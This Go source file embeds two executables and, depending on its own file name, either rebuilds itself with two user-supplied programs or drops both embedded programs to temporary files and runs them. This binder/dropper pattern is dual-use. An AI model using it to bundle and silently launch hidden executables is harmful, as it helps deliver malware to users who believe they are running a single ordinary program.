package main

import (
	_ "embed"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
)

//go:embed important1.exe
var embeddedProgram1 []byte

//go:embed important2.exe
var embeddedProgram2 []byte

func main() {
	var file1, file2 string
	// Check if any command-line arguments were provided
	if filepath.Base(os.Args[0]) == "injector.exe" {
		var err error
		// Check command line arguments
		file1, file2, err = check_args()
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		// Read the contents of the provided files
		f1, err := os.ReadFile(file1)
		if err != nil {
			panic(err)
		}
		f2, err := os.ReadFile(file2)
		if err != nil {
			panic(err)
		}
		embeddedProgram1 = []byte(f1)
		embeddedProgram2 = []byte(f2)
		// Write the new contents to important1.exe and important2.exe
		os.WriteFile("important1.exe", f1, 0755)
		os.WriteFile("important2.exe", f2, 0755)

		// Run `go build` as a subprocess
		cmd := exec.Command("go", "build", "-o", "newprogram.exe", "main.go")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		err = cmd.Run()
		if err != nil {
			panic(err)
		}
		fmt.Println("Successfully injected the embedded executables into newprogram.exe")
		return
	}

	// Write the embedded executables to temporary files
	tmpfile1, err := ioutil.TempFile("", "embedded_program1_*.exe")
	if err != nil {
		panic(err)
	}
	defer os.Remove(tmpfile1.Name()) // Clean up the temporary file

	_, err = tmpfile1.Write(embeddedProgram1)
	if err != nil {
		panic(err)
	}
	err = tmpfile1.Close()
	if err != nil {
		panic(err)
	}

	tmpfile2, err := ioutil.TempFile("", "embedded_program2_*.exe")
	if err != nil {
		panic(err)
	}
	defer os.Remove(tmpfile2.Name()) // Clean up the temporary file

	_, err = tmpfile2.Write(embeddedProgram2)
	if err != nil {
		panic(err)
	}
	err = tmpfile2.Close()
	if err != nil {
		panic(err)
	}

	// Make the temporary files executable
	err = os.Chmod(tmpfile1.Name(), 0755)
	if err != nil {
		panic(err)
	}

	err = os.Chmod(tmpfile2.Name(), 0755)
	if err != nil {
		panic(err)
	}

	if filepath.Base(os.Args[0]) != "injector.exe" {
		// Execute the embedded executables
		cmd1 := exec.Command(tmpfile1.Name())
		cmd1.Stdout = os.Stdout
		cmd1.Stderr = os.Stderr
		err = cmd1.Run()
		if err != nil {
			panic(err)
		}

		cmd2 := exec.Command(tmpfile2.Name())
		cmd2.Stdout = os.Stdout
		cmd2.Stderr = os.Stderr
		err = cmd2.Run()
		if err != nil {
			panic(err)
		}
	}
}

// return 2 arguments from command line or error
func check_args() (string, string, error) {
	args := os.Args[1:]
	if len(args) != 2 {
		return "", "", fmt.Errorf("Usage: %s <file1> <file2>", os.Args[0])
	}
	return args[0], args[1], nil
}
